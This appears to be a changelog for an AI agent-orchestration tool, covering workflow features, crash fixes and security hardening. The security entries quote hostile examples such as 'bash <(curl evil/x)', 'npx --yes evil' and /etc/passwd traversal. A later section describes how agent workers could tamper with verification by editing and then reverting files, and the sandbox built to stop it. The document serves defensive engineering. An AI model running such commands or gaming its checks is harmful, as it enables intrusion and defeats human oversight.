- `⏸ Phase: <name>` — a phase whose completion scrolled out of the recent-event
  window and is not the current one.

Implementation details:

- New pure-function module `src/ui/dwf-phase-display.ts`:
  `extractDwfPhaseState(events)` derives phase state from the event window
  (returns `null` for non-DWF runs); `renderDwfPhaseLines(state, { ascii })`
  renders markers with Unicode glyphs and ASCII fallbacks (`[>]`/`[v]`/`[ ]`).
- `RunUiSnapshot` gains an optional `dwfPhaseState` field, computed from the
  existing tailed `recentEvents` window (no extra I/O) in both sync and async
  snapshot builders.
- `progress-pane.ts` renders the phase lines right after the summary line,
  before the task-based phase grouping. Non-DWF runs produce zero lines.
- `signatureFor` includes `dwfPhaseState` so cache invalidation reflects phase
  changes.
- Tests: `test/unit/dwf-phase-display.test.ts` — phase state tracking from an
  event sequence (incl. scrolled-off recovery), correct markers (Unicode +
  ASCII), header gating, and non-DWF snapshots unaffected.

## [v0.9.7] — round-14 (P1 DX + observability) (2026-06-23)

Four additive P1 features land in this round — **authoring types**, **per-workflow
token budget**, **log API**, and **typed args**. **Backward compatible** — existing
DWF scripts continue to work unchanged. New behavior is opt-in.

### Feature 1 — Authoring Types / IDE IntelliSense (P1-1)

**Files:** `types/dwf.d.ts` (new) + `package.json` (`./workflow` export)

A `.dwf.ts` script can now import the `WorkflowCtx` (and supporting) types from
the package's `./workflow` export for full TypeScript IntelliSense:

```ts
import type { WorkflowCtx } from "pi-crew/workflow";
export default async function run(ctx: WorkflowCtx): Promise<void> { /* ... */ }
```

- New file: `types/dwf.d.ts` — named exports mirroring the runtime types
  (`WorkflowCtx`, `AgentCallOpts`, `AgentResult`, `WorkflowBudget`, ...).
- `package.json` gains `"./workflow": { "types": "./types/dwf.d.ts" }` and ships
  the `types/` directory.
- New test: `test/unit/dwf-authoring-types.test.ts` — compiles a sample `.dwf.ts`
  against the export (positive + negative `@ts-expect-error` check).

### Feature 2 — Per-Workflow Token Budget (P1-2)

**Files:** `src/runtime/dynamic-workflow-context.ts` + dispatch wiring

`ctx.budget` is a frozen `{total, spent(), remaining()}` surface. When a
per-workflow token budget is set, `ctx.agent()` auto-rejects with `ok:false`
(`"workflow token budget exhausted"`) **before** spawning a child worker. `spent()`
accumulates each run's reported `usage.input + usage.output`.

- `total` is `null` (unbounded) by default; `remaining()` is `Infinity` then.
- New `MakeWorkflowCtxOptions.tokenBudget`, `WorkflowConfig.maxTokenBudget`,
  `RunDynamicWorkflowInput.tokenBudget`, and the `team run` `tokenBudget` param
  (param overrides the workflow value).
- Budget check + accumulation wired into `ctx.agent()`; budget object passed
  through `run.ts` and `background-runner.ts`.
- Tests: 7 unit cases (default null, set total, spent/remaining, exhaustion,
  accumulation from the mock's `{input:10,output:5}`, frozen check).

### Feature 3 — Log API (P1-3)

**Files:** `src/state/contracts.ts` + `src/runtime/dynamic-workflow-context.ts`

`ctx.log(message)` appends a workflow-level log line: stringifies non-strings,
keeps a bounded in-memory copy (capped at **1000**), and always emits a durable
`dwf.log` event (`{message}`) to the run's `events.jsonl`.

- New event type `"dwf.log"` in `TEAM_EVENT_TYPES` (non-terminal).
- New runner-only `getWorkflowLogs(ctx)` accessor (mirrors `getWorkflowPhaseState`).
- Tests: 4 unit cases (append, stringify, event emission, 1000-cap) + 1
  integration case (end-to-end through `runDynamicWorkflow`).

### Feature 4 — Typed Args (P1-5)

**Files:** `src/runtime/dynamic-workflow-context.ts` + `src/state/types.ts` +
`src/schema/team-tool-schema.ts` + `src/state/state-store.ts` + dispatch wiring

`ctx.args<T>()` returns typed workflow arguments (sourced from `manifest.args`,
passed via the run `args` param). Defaults to `{}` when unset.

- New `TeamRunManifest.args`, `MakeWorkflowCtxOptions.args`, `createRunManifest`
  `args` param, and the `team run` `args` schema field (`Type.Unsafe`, any JSON
  value — avoids `any`).
- The runner reads `manifest.args` and forwards it to `makeWorkflowCtx`.
- Tests: 3 unit cases (default `{}`, typed object, array) + 1 integration case
  (reads `manifest.args` end-to-end).

### Other

- Version bumped `0.9.7` → `0.9.8`.
- `docs/dynamic-workflows.md`: API table rows + Log/Budget/Args/Authoring-types
  sections.

## [v0.9.7] — round-13 (P0 AST determinism + structured output + abort cleanup) (2026-06-23)

Three P0 features land in this round. **Backward compatible** — existing DWF
scripts continue to work unchanged. New behavior is opt-in via the `schema`
field on `ctx.agent()` and an env-var escape hatch for the determinism check.

### Feature 1 — AST Determinism Check (P0-2)

**File:** `src/runtime/deterministic-ast.ts` (new) +
`src/runtime/dynamic-workflow-runner.ts` (integration)

Dynamic workflow scripts must now be **deterministic**. The runner parses each
`.dwf.ts` with `acorn` and walks the AST, rejecting `Date.now()`,
`Math.random()`, and `new Date()` calls before `jiti` executes the script.
Two runs of the same script against the same inputs now produce the same
outputs — critical for regression testing and workflow replay.

Why AST, not regex: regex matches `Date.now()` everywhere — including string
literals, comments, and prompt text. AST walking distinguishes **calls** from
strings, so prompts that say *"avoid `Date.now()` in your code"* still parse
cleanly. Other `Date.*` and `Math.*` methods (`Date.parse`, `Date.UTC`,
`Math.floor`, `Math.max`, etc.) are accepted — only `now` and `random` are
blocked.

- New dep: `acorn ^8.14.0` (small, well-maintained; verified Node ≥22 ESM/strip-types compatibility)
- New file: `src/runtime/deterministic-ast.ts` (determinism walker; MIT-licensed adaptation from pi-dynamic-workflows, attribution in `NOTICE.md`)
- New file: `test/unit/deterministic-ast.test.ts` (27 cases: accepts/rejects every form, comments, template literals, computed properties, parse-error delegation)
- New tests in `test/integration/dwf-setresult.test.ts` (5 end-to-end cases including env-var opt-out)

**Escape hatch:** `PI_CREW_DWF_SKIP_DETERMINISM_CHECK=1` bypasses the check for
power users who legitimately need time/random (e.g. randomized benchmark
scripts). Off by default.

### Feature 2 — Structured Output Helper (P0-3)

**Files:** `src/runtime/result-extractor.ts` + `src/runtime/dynamic-workflow-context.ts`

`AgentCallOpts` gains an optional `schema?: TSchema` field (TypeBox). When set,
`ctx.agent()` validates the extracted JSON against the schema via
`@sinclair/typebox`'s `Value.Check`. Mismatch yields
`{ok: false, error: "structured output does not match schema: ..."}` instead
of an untyped `structured: { ... }` blob.

How the runner helps the model comply:

- Appends a JSON-output directive to the prompt.
- Replaces the agent's system prompt suffix with a "structured-output
  assistant" preamble that describes the schema's shape.

When `schema` is **omitted**, behavior is byte-identical to the previous
regex-based extractor — verified by the existing 30+ test cases plus 9 new
schema-specific cases in `test/unit/result-extractor.test.ts` and 4 new
end-to-end cases in `test/unit/dynamic-workflow-context.test.ts`.

Caveat: pi-crew DWF spawns `pi` as a subprocess (`runChildPi`), not an
in-memory `createAgentSession`. Subprocess structured output is captured via
the same event-stream → JSON-line → schema-check pipeline used for everything
else, so this round ships Option B (regex-extract + schema validation
post-hoc). Option A (in-process terminating tool) is planned for round-14.

### Feature 3 — Abort Listener Cleanup (P0-5) — NO-OP (already fixed in round 27)

Audited `src/runtime/child-pi.ts` for AbortSignal listener leaks. The fix was
landed in round 27 (BUG 4): both the `onParentAbort` flag handler and the
`abort` cancellation handler are now removed inside `settle()` regardless of
the exit path (normal completion, response timeout, hard kill, parent abort,
forced final drain). On runs with >10 tasks sharing one AbortSignal (the
common pattern under `background-runner`), this prevents the
`MaxListenersExceededWarning` and per-task closure capture that previously
pinned the worker stack frame in memory.

No code changes needed in round 13. Documented for the audit trail.

### Verification

- `npm run typecheck` — clean
- `npx tsc --noEmit` — clean
- 31 new unit tests across `deterministic-ast.test.ts` (27) and 9 schema-validation cases in `result-extractor.test.ts` and 4 new cases in `dynamic-workflow-context.test.ts` — all pass
- 5 new integration tests in `dwf-setresult.test.ts` — all pass
- 0 regressions in the existing 4 round-12 tests


## [v0.9.7] — round-12: DWF phases + structured-clone guard (2026-06-23)

Two additive P0 features for dynamic-workflow (DWF) scripts, both fully
backward-compatible (existing scripts continue to work unchanged). Researched
and adopted from the public `pi-dynamic-workflows` (Michaelliv/v1.0.1)
package — full comparison and adoption plan in
`.crew/artifacts/team_20260623095016_b693d3f967f88048/shared/06_synthesize.md`.

### Feature 1: `ctx.phase(title)` runtime phase API (P0-1)

`WorkflowCtx` gains a new `phase(title: string): void` method. The orphan
`dwf.phase_started` / `dwf.phase_completed` event types — declared in
`src/state/contracts.ts:89-93` since v0.9.0 but never produced by any
producer — finally have a producer. Use cases:

- Group `ctx.agent()` calls under logical phases (e.g. "Scan", "Audit",
  "Review") so downstream UI and log readers can group by phase.
- Emit a clear phase boundary to the run's `events.jsonl` without writing
  custom event-log code.
- Drive live progress reporting from the script itself.

Semantics:

- Validates `title` is a non-empty string (throws `TypeError` otherwise).
- Idempotent: calling `ctx.phase("Scan")` twice does not emit a duplicate
  event or change state.
- When a previous phase is still open, emits `dwf.phase_completed` for it
  **before** emitting `dwf.phase_started` for the new one (consumers never
  see two open phases at once).
- The in-memory `phases[]` list (read-only via `getWorkflowPhaseState`,
  mirrors the `__finalResult` non-enumerable getter pattern) is deduped and
  capped at **100 distinct titles** to bound memory. Events still flow
  past the cap — the events log is the durable source of truth.
- The runner **auto-closes the last open phase** before emitting
  `dwf.completed`, so a script that ends mid-phase still produces a
  well-formed event sequence.

**Files changed:**
- `src/runtime/dynamic-workflow-context.ts` — interface, implementation,
  `__phaseState` getter, `getWorkflowPhaseState` helper
- `src/runtime/dynamic-workflow-runner.ts` — auto-close on completion

### Feature 2: structured-clone guard at the runner boundary (P0-4)

Defensive `assertStructuredCloneable(value, name)` helper applied to the
final artifact content and `manifest.summary` before they reach
`writeArtifact` and the run-event-bus emitter. Today this is mostly
future-proofing (the artifact file is read as a string, and strings are
always structured-cloneable), but the guard surfaces a clear, actionable
error pointing at the most common cause — forgetting `await` on
`ctx.agent()` / `ctx.review()` — instead of letting a cryptic
`DataCloneError` leak from deep inside the artifact store.

**Files changed:**
- `src/runtime/dynamic-workflow-runner.ts` — `assertStructuredCloneable`
  helper, applied to `finalText` and `summaryText` (slice)

### Tests

- 7 new unit tests in `test/unit/dynamic-workflow-context.test.ts`
  (emission, idempotency, validation, sequence, helper, dedup, 100-cap).
- 1 new integration test in `test/integration/dwf-setresult.test.ts`
  (end-to-end phase event sequence, including runner auto-close).
- All 23 existing DWF unit tests still pass; both pre-existing integration
  tests still pass.

### Docs

- `docs/dynamic-workflows.md` — updated WorkflowCtx example to use
  `ctx.phase("Scan")` / `ctx.phase("Audit")`; added a `ctx.phase` row to
  the API table; added a "Phases (round-12)" subsection explaining
  semantics, idempotency, and the 100-cap.

### Out of scope (planned for future rounds)

- AST determinism check (P0-2)
- Structured output helper (P0-3)
- Abort listener cleanup pattern (P0-5)
- Authoring types / IDE IntelliSense (P1-1)
- Token budget (P1-2)
- Phase UI in `progress-pane` (P1-4)
- Pipeline primitive (P2-1)
- `isolated-vm` sandbox (P2-2, planned for v1.5)

## [v0.9.5] — fix "team run hangs forever at 25%" (2026-06-23)

Two coupled runtime bugs caused the recurring "run stuck at 25% (1/4)" failure
observed across 4+ consecutive review/fast-fix runs. Both are now fixed; full
diagnostics (background.log, events.jsonl, heartbeat.json) are preserved for
all runs.

### Bug X — `purgeStaleActiveRunIndex` destroyed the run's stateRoot (proximate cause)

**File:** `src/runtime/crash-recovery.ts`

**What was wrong:** `purgeStaleActiveRunIndex` decided whether a run was
"orphaned" using `entry.updatedAt`, which is **frozen at registration** and
never refreshed during execution. A long-running legitimate async run whose
background worker had exited (e.g. after a 5–15 min explorer) would have its
entire durable state (manifest/tasks/events/heartbeat) hard-deleted. Because
`saveRunTasks()` silently no-ops once the state dir is missing, the workflow
could never advance past the current task → **permanent invisible hang**
("Run not found"), with all diagnostics lost.

**Fix:**
- Liveness now corroborated via (a) the on-disk `manifest.updatedAt` (rewritten
  on every task transition) and (b) the team-level `heartbeat.json` mtime —
  any one of which is sufficient to declare the run live.
- Cancelling a run now **keeps its stateRoot** so the run stays queryable and
  resumable, and its diagnostics survive. The finished-run pruner removes the
  directory later on its normal schedule.
- Removed two redundant `saveRunManifest(fullLoaded.manifest)` calls that
  were clobbering the freshly-saved `cancelled` status back to `running`.

**New regression test:** `test/unit/crash-recovery-purge-liveness.test.ts`
(3 cases: fresh manifest kept, orphan cancelled-but-preserved, fresh
heartbeat kept — all using a live-worker-then-reap + `now`-time-shift
harness to deterministically simulate the registration-then-aging race).

### Bug Y — background runner crashed with EPIPE on the first post-detach `console.debug` (root cause)

**File:** `src/runtime/background-runner.ts`

**What was wrong:** The in-process console redirect only covered `console.log`
and `console.error`; `console.debug` and `console.warn` still wrote to the
original stdout/stderr pipes. The background runner is spawned with
`detached:true` + `setsid:true`, so the parent disconnects the stdio pipes
immediately after spawn. The first post-detach `console.debug` call from
`team-runner.ts:242` (inside `mergeTaskUpdatesPreservingTerminal` →
"Skipping stale merge") hit the closed stdout → unhandled `EPIPE` error →
**process exit** → scheduler dead → run stuck at 25% forever.

Prior investigators saw only "the run died silently right after explorer
completed" and concluded (incorrectly) that the cause was a native crash
(SIGKILL/segfault/V8 heap-OOM), because their [DIAG] handlers never fired.
In reality the diagnostic handlers DID fire — but on a `EPIPE` write error,
which `process.on('error')` doesn't catch. The fix below makes the crash
observable AND non-fatal.

**Fix:**
- Extend the console redirect to also cover `console.debug` and `console.warn`,
  so they go to the log file (logFd) instead of the disconnected stdio pipes.
- Wrap the `fs.writeSync` in try-catch so any log-write failure (closed fd,
  ENOSPC, etc.) can never crash the scheduler. The scheduler log is
  best-effort by design.

**New regression test:** `test/unit/background-runner-console-redirect.test.ts`
(4 cases: undefined logFd no-op, valid logFd writes correctly, EBADF on
closed logFd is swallowed, post-undefined fd-toggle is safe). Replicates the
`origWrite` pattern from the source so any drift between the two is easy to
spot.

### Why this took multiple attempts

All prior attempts to diagnose the hang destroyed the only evidence (the
stateRoot) the moment the `purgeStaleActiveRunIndex` heuristic misfired.
The chain was always the same: a worker exits for any reason → purge sees
dead PID + frozen-stale entry → **deletes stateRoot** → the run becomes
"Run not found" with no log, no events, no heartbeat, no way to even resume.
That hid the real cause (Bug Y) for the entire series of failed diagnostic
runs. With Bug X fixed, the diagnostic trail (background.log 345 KB +
events.jsonl 166 KB) survives long enough to read the actual EPIPE crash
that Bug Y left behind.

### Verification

- 7/7 new regression tests pass (`crash-recovery-purge-liveness.test.ts` +
  `background-runner-console-redirect.test.ts`).
- Existing crash-recovery / active-run-registry / stale-reconciler /
  async-stale / run-accumulation / auto-recovery suites: 71/71 pass.
- End-to-end: a 4-step review run now advances 3/4 tasks (75%) instead of
  hanging at 25%; the verify step that would have failed earlier now fails
  only for environmental reasons (memory OOM under load), not the fix.
- `npx tsc --noEmit` is green.

### Notes for users

If you have a stuck "running" run from v0.9.4 or earlier (the symptom was
"Run not found" / "25% hang" / "had to kill pi"), upgrading alone will not
recover it — its `stateRoot` was already destroyed by the buggy purge.
Re-dispatch the workflow. New runs are fully protected.

## [v0.9.4] — fix macOS CI: benchmark allowlist + cross-platform fixtures (2026-06-23)

Patch fix for a CI failure introduced in v0.9.3 (caught by the macOS CI job,
which the v0.9.3 release unfortunately did not wait for — lesson learned).

### What was wrong

The v0.9.3 benchmark test fixtures used `grep --help` as a benign exit-0
command. GNU grep (Linux) exits 0, but **BSD grep (macOS) does not support
`--help`** and exits 2 — so `runBenchmarkSuite computes total counts` failed
on macOS CI (`2 !== 0`). Local Linux verification missed this.

### Fix

- `benchmark-runner.ts`: added `echo` to the command allowlist. Safe because the
  shell-metachar blocker already rejects command substitution (`$(…)`, backticks),
  so `echo $(evil)` cannot execute; bare `echo …` only prints. `echo` is the
  canonical cross-platform exit-0 command.
- `test/unit/benchmark.test.ts`: fixtures switched from `grep --help` → `echo ok`
  (exits 0 on Linux/macOS/Windows-sh). The "not in allowlist" test now uses `ls`
  (genuinely disallowed).

### Process note

This is the release where the project re-commits to: **tag/publish ONLY after
the full OS matrix CI (ubuntu/windows/macos) is green.** v0.9.3 was published
mid-CI-run; the package itself is correct (the broken file is test-only and
not shipped), but the repo CI went red. v0.9.4 restores green CI.

## [v0.9.3] — security hardening + crash-diagnostics (code review 2026-06-23)

Patch release addressing findings from a full codebase code review
(`research-findings/pi-crew-code-review-2026-06-23.md`), plus observability fixes
for silent background-runner deaths.

### Critical

- **C-1** `worktree/branch-freshness.ts`: the `git()` helper spawned git with the
  full parent env, leaking every API key/token to any git hook/alias/credential-
  helper. Now uses `sanitizeEnvSecrets()` (mirrors `worktree-manager.ts`).

### High

- **H-1** `tools/safe-bash.ts`: `isDangerous()` missed Bash process substitution
  `<(...)`/`>(...)`, which executes commands in a subshell bypassing all pipe-
  based checks (e.g. `bash <(curl evil/x)`). Now blocked.
- **H-2** `runtime/cross-extension-rpc.ts`: RPC authorization relied on a
  self-declared `source === "pi-crew"` field any co-installed extension could
  spoof. Now also requires an unguessable per-process token (`getCrewRpcToken()`).
- **H-3** `extension/team-tool/run.ts`: result/summary artifact reads used a
  `path.isAbsolute()` shortcut + bare `path.join`, allowing arbitrary file read
  (`/etc/passwd`) and `../` traversal. Now routed through `resolveRealContainedPath()`.
- **H-4** `ui/live-conversation-overlay.ts`: `cachedLines` grew unbounded during
  long live sessions (OOM). Now capped at 5000 lines (ring buffer).
- **H-6** `runtime/orphan-worker-registry.ts`: `pid` was interpolated into an
  `execSync` shell string with no runtime assertion (command injection via a
  poisoned state file). Now `Number.isFinite()`-guarded + `execFileSync` argv.
- **H-7** `benchmark/benchmark-runner.ts`: the command allowlist permitted `npx`/
  `node`, enabling arbitrary code execution without metacharacters
  (`npx --yes evil`, `node -e …`). Removed; use `npm test`/`cargo test`.

### Medium

- **M-1** `runtime/post-checks.ts`, `runtime/task-runner.ts`: hand-rolled
  `path.resolve + startsWith` containment was vulnerable to symlink traversal;
  replaced with `resolveRealContainedPath()`.
- **M-2** `workflows/intermediate-store.ts`: `phase`/`stepId` were interpolated
  into a filename via `path.join` with no validation (path traversal via a
  poisoned stepId). Now validated with `isSafePathId()`.
- **M-3/M-4** `runtime/verification-gates.ts`: the dangerous-shell regex allowed
  bare `>` file redirects and used a confusing `[^^&]` char class. Replaced with
  a `[<>](?![&\d])` lookahead that blocks file redirects while allowing
  `2>&1`/`>&N` fd-duplication.
- **M-5** `tools/safe-bash.ts`: the overly-permissive-`allowPatterns` rejection
  only caught patterns matching both `""` and `"rm -rf /"`; a pattern like `/.+/`
  bypassed it. Now tests each pattern against a battery of dangerous commands.
  (`safeRead` removed from the `permissive` preset — it allowed `cat` of any file.)
- **M-7** `config/config.ts`: the `PI_TEAMS_HOME` containment check was bypassed
  whenever `NODE_ENV=test`, reachable from staging/CI environments. The explicit
  `PI_CREW_SKIP_HOME_CHECK=1` flag is now the only opt-out (test runner sets it).
- **M-8** `hooks/registry.ts`: the prototype-pollution key lookup omitted
  `.normalize("NFKC")`, so fullwidth-confusable keys (e.g. `__ｐroto__`, U+FF4F)
  bypassed sanitization. Now normalized in both lookups.
- **M-9** `runtime/verification-gates.ts`: the command-timeout `setTimeout` was
  never stored/cleared, keeping the event loop alive for the full timeout and
  firing `kill()` on an already-dead process. Now stored, `unref()`'d, and
  cleared on close/error.
- **M-10** `ui/live-run-sidebar.ts`: `dispose()` did not clear `autoCloseTimeout`,
  so a disposed sidebar could fire `done()` later. Now cleared.
- **M-11** `ui/settings-overlay.ts`: local width/truncate helpers counted
  characters naively (broke CJK/emoji alignment). Now delegate to the
  Unicode-aware `utils/visual.ts`.
- **M-13** `ui/tool-renderers/index.ts`: removed dead `linkPath()` that
  interpolated a path into an OSC-8 escape without sanitizing control chars.

### Crash diagnostics (background runner)

Three observability fixes so silent background-runner deaths leave a trace
(root-caused a memory-pressure OOM/abort that previously vanished without a log):

- **async-runner.ts**: drain the child stderr pipe into `background.log` instead
  of destroying it (native abort/segfault messages were being swallowed). Buffer
  capped at 256 KB.
- **async-runner.ts**: V8 `--report-on-fatalerror` is now ON by default (writes a
  report file into the run stateRoot); opt out with `PI_CREW_BG_REPORT_ON_FATAL=0`.
- **background-runner.ts**: documented why the console redirect alone cannot
  catch native crashes.

### Tests

- Regression tests added for H-1 (process substitution) and M-8 (NFKC-confusable
  prototype pollution).
- `getBackgroundRunnerCommand` tests updated for the new default report flags.
- Benchmark test fixtures migrated off `npx`/`node` (now `grep --help`).

### Not addressed in this release

- **H-5** (transcript-viewer redundant disk I/O) — performance, deferred.
- **H-8** (live-control injection) — pair with full event-bus origin signing.
- **M-6** (per-child API-key scoping) — architectural; tracked separately.
- **M-12/M-14** (widget dedup, shared elapsed helper) — maintainability, deferred.

## [v0.9.2] — package cleanup: remove scratch scripts leaked into npm tarball (2026-06-22)

Patch release. **No code changes.** Purely a published-package hygiene fix.

### What was wrong

The `package.json` `files` field includes a root-level `*.mjs` glob, intended
for the legit `install.mjs` (postinstall script). It accidentally also picked
up three ad-hoc scratch scripts that were committed at the repo root during
earlier development:

- `test-tp.mjs` — a 12-line `tool-progress` format smoke print
- `test-bugs-all.mjs` — an 89-line string-matching bug-fix verifier
- `test-lastActivityAt.mjs` — a manual `node:test` for a heartbeat fallback

All three shipped in the published npm tarball (v0.9.0 and v0.9.1) even though
they are not part of `npm test` and have no runtime value for consumers.

### Fix

- `git rm`'d the three scratch scripts. The behavior they checked is covered by
  the real unit suite (`test/unit/`), which does NOT ship to npm.
- After the fix, the only `.mjs` in the tarball is the intended `install.mjs`.

### Verification

- tsc: 0
- `npm pack --dry-run` confirms `install.mjs` is the only `.mjs` shipped
- regression suite (env-allowlist, goal-p1d-schema): 11/11 pass
- No behavior change — consumers see no functional difference

### Breaking changes

None.

---

## [v0.9.1] — Windows essentials fix + cross-platform CI green (2026-06-22)

Patch release. No new features. Fixes a real Windows bug reported by a user,
plus the cross-platform CI failures that followed.

### fix(windows): `${APPDATA}` npm-global resolution failure (root cause)

Reported symptom (Windows): running pi-crew created a phantom literal
`${APPDATA}/npm/` directory in the project root (containing `node_modules`,
`pi-crew`, `pi-crew.cmd`, `pi-crew.ps1`) and leaked a literal `${APPDATA}`
line into `.gitignore`.

Root cause: pi-crew's subprocess env sanitization used explicit allowlists
that stripped **all Windows-essential env vars** (`APPDATA`, `LOCALAPPDATA`,
`USERPROFILE`, `SystemRoot`, `ComSpec`, `TEMP`, `TMP`). When a child pi
process (or npm inside it) tried to resolve the npm-global prefix on Windows,
it used `%APPDATA%` (cmd expansion) / `${APPDATA}` (bash expansion), but
`APPDATA` was missing from the env — so the shell left the literal
`${APPDATA}` in place and operations created/ignored paths under that
literal name.

Fix: added the 7 Windows essentials to all 7 subprocess env allowlists
(child-pi, async-runner, verification-gates, post-checks, iteration-hooks,
worktree/cleanup, worktree/worktree-manager). (commit `a7ddc50`)

### refactor(env): centralize Windows essentials + regression guard

The same 7 vars were duplicated inline across 9 call sites — easy to forget
on a new allowlist, with nothing preventing a future site from omitting them.

- New single source of truth: `WINDOWS_ESSENTIAL_ENV_VARS` in
  `src/utils/env-allowlist.ts` (with full root-cause documentation).
- All 9 call sites now spread the constant instead of inlining (net −42/+19
  lines, behavior unchanged).
- New regression test `test/unit/env-allowlist.test.ts`: scans ALL
  `src/**/*.ts` files and fails if any hardcodes the 7 vars inline (the only
  allowed location is the constant file). This catches any new allowlist that
  forgets the constant — the exact regression that caused the bug.
(commit `6a0284c`)

### fix(ci): cross-platform CI green (ubuntu + macOS + Windows)

Three distinct containment/path bugs that only surfaced on non-ubuntu CI:

1. **Windows 8.3 short-name paths** — `resolveWindowsCanonical()` used
   non-native `realpathSync`, preserving the `RUNNER~1` vs `runneradmin`
   form mismatch. A legitimately-contained dynamic workflow file was
   rejected as "outside the allowed directories". Fixed by using
   `realpathSync.native` (canonical long-name form) as the primary resolver.
   (commit `e9e7137`)

2. **ESM `file://` URLs** — two integration tests passed raw Windows paths
   (`D:\…`) to native `import()`, which Node rejects on Windows
   (`ERR_UNSUPPORTED_ESM_URL_SCHEME: protocol 'd:'`). Wrapped with
   `pathToFileURL(…).href`. (commit `e9e7137`)

3. **macOS symlink-ancestor** — `isSymlinkSafePath()` walked up the temp
   path and hit `/var` (a symlink → `/private/var`). The old check compared
   the resolved `/private/var` against the tmpdir
   `/private/var/folders/…/T` — `/private/var` is an **ancestor**, not a
   descendant, so it was wrongly rejected (5 macOS worker-atomic-writer
   failures). Fixed by accepting a symlink whose target is a safe root, is
   UNDER a safe root, OR is an ANCESTOR of a safe root. Added two behavioral
   regression tests (symlink-ancestor accept + symlink-attack reject).
   (commit `e9e7137`)

4. **macOS `/var` containment** — `resolveContainedPath()` only
   canonicalized paths on win32; on POSIX it compared raw paths, so base
   (`/private/var`) vs target (`/var`) diverged → false "outside" rejection
   (macOS dwf-setresult failure). Added platform-agnostic
   `resolveCanonicalPath()`. Added a darwin-only regression test for the
   real `/var` divergence. (commit `4821bb1`)

5. **Windows wakeup timing** — `subagent-manager` polls the child run
   manifest every 1000ms. On the slower Windows CI runner, child-process
   spawn + first poll exceeded the test's 10s deadline (failed at 11.6s).
   Bumped the mock-test deadline to 30s. (commit `4821bb1`)

### Verification

- tsc: 0
- Full test suite: 5207 tests, 0 fail on **all three** platforms (ubuntu,
  macOS, Windows)
- CI run `27955398241`: success across ubuntu-latest, macos-latest,
  windows-latest
- Regression tests added: env-allowlist scan, worker-atomic-writer symlink
  ancestor/attack, safe-paths darwin `/var` divergence

### Breaking changes

None. All fixes are additive or behavior-preserving. Windows users who hit
the `${APPDATA}` bug should upgrade.

---

## [v0.9.0] — goal loops + dynamic workflows (2026-06-18)

Two new features, both built on a shared `runKind` background-dispatch discriminator.

### Phase 1.5 #4: TDZ fix — dynamic-workflow runs end-to-end via full pi pipeline (RFC 17 fix)

Live `team action='run' workflow='<dynamic>'` was failing with
`Dynamic workflow 'X' must export a default async function(ctx).` even
though the .dwf.ts loaded correctly via direct jiti. Root cause was NOT
in `dynamic-workflow-runner.ts` — it was a Temporal Dead Zone race in
`team-tool/run.ts` when loaded via the full pi extension pipeline
(`index.ts → register.ts → registration/team-tool.ts → team-tool.ts →
run.ts`).

**Race details**: jiti loads each .ts file inside an `async function
_module(...)` wrapper. Static `import { X } from "..."` statements
become `var _x = require(...)` calls. When a destructured `import` is
referenced inside a hoisted function before its `let` declaration line
runs, the reference hits TDZ.

**Fixes**:
- `src/extension/team-tool/run.ts`:
  - `crewInitPromise`: `let` → `var` (avoids TDZ)
  - `expandParallelResearchWorkflow`, `validateWorkflowForTeam`,
    `normalizeSkillOverride`: convert to lazy dynamic imports at call site
- `src/state/crew-init.ts`:
  - `CREW_README`: `const` → `function buildCrewReadme(): string` (function
    declarations are fully hoisted)
  - `updateGitignore`: convert usage to lazy dynamic import at call site

**New test**: `test/integration/run-via-full-pipeline.test.ts` loads
`index.ts` via `jiti.import()` the way pi does, invokes `handleRun` with a
dynamic workflow params, and asserts no TDZ / ReferenceError is thrown.
Fails without the fix, passes with it.

**Verification**:
- 108 unit tests pass (goal, dwf, redaction, verification, worker-writer)
- New integration test passes
- Direct simulation of pi pipeline → `Dynamic workflow 'demo-hello'
  completed` (was: `failed: must export a default async function`)

Closes RFC 17 §4 round-trip / investigated residual. See
`research-findings/goal-workflow/17-PHASE1.5-CRASH-INVESTIGATION-RFC.md`
for the full 8-attempt investigation log (gdb, strace, V8 report, sync
workarounds, worker-thread atomic writer, auto-downgrade — none
identified the real bug because they all skipped the full pi load path).

### Phase 1.5 #3: V8 diagnostic report infrastructure + crash investigation closed

`PI_CREW_BG_REPORT_ON_FATAL=1` makes the background goal-loop runner spawn
with `--report-on-fatalerror --report-compact`. When V8 considers the
process state fatal, it writes a diagnostic report (native stack, JS stack,
libuv handles, environment) — crucial info that application-level signal
handlers cannot capture.

**Investigation result** (RFC 17, 5+ reproduction attempts): the multi-step
goal-wrap crash does NOT produce a V8 report. Combined with prior findings
(no signal via strace, no coredump, no OOM, parent process alive) the crash
signature is consistent with a V8/libuv internal abort that bypasses all
Node.js reporting mechanisms. Cannot be diagnosed or fixed at the
application level.

**Decision**: ship with the existing auto-downgrade safety net
(commit `6de5270`). Multi-step workflows silently run as normal team-runs
(no goal-wrap layer); single-step workflows (implementation) continue to
goal-wrap end-to-end. The `--report-on-fatalerror` infrastructure remains
in place for future investigation if a Node.js version change alters the
crash behavior.

See `research-findings/goal-workflow/17-PHASE1.5-CRASH-INVESTIGATION-RFC.md`
for the full 8-attempt investigation log and re-opening criteria.

### Phase 1.5 #2: git-worktree verification sandbox (closes round-trip + invoked-script tamper)

`PI_CREW_VERIFICATION_WORKTREE=1` runs verification commands in a pristine
`git worktree` at the T_snap commit SHA. Closes the two remaining Med-High
tampering residuals from RFC 13 §6 that P1a manifest hashing cannot detect:

- **Round-trip manifest tamper (MAJ#2)**: worker edits `package.json`, runs
  `npm test` (passes), reverts before T_verify_done → hash matches →
  tamper undetected. With worktree: verification runs at original SHA →
  worker edits invisible → tamper BLOCKED.
- **Invoked-script tampering**: worker rewrites a script the verification
  command invokes; only MANIFEST_FILES are hashed → invisible. With
  worktree: script is at original SHA → tamper BLOCKED.

Graceful fallback when ANY precondition fails (logged via
logInternalError "goal-loop.worktreeSandboxBypassed"): opt-out env,
not-a-git-repo, dirty index, git unavailable. NEVER blocks the goal loop.

Implementation:
- `src/runtime/verification-worktree.ts` (NEW, pure leaf module):
  `isWorktreeSandboxEnabled`, `checkWorktreeSandboxAvailable`,
  `prepareVerificationWorktree` (git worktree add --detach),
  `withVerificationWorktree` (RAII cleanup, idempotent, finally-safe).
- `src/runtime/verification-gates.ts`: `executeVerificationCommands`
  accepts optional `worktreeCwd` — spawns commands with that cwd.
- `src/runtime/goal-loop-runner.ts`: verification call site prepares
  worktree at T_snap SHA when available; finally block always cleans up.
- `src/runtime/async-runner.ts`: PI_CREW_VERIFICATION_WORKTREE env
  inherited by bg-runner.

Tests: 12 new unit tests in `test/unit/verification-worktree.test.ts`
(flag opt-in, not-a-repo fallback, dirty-index fallback, clean-repo success,
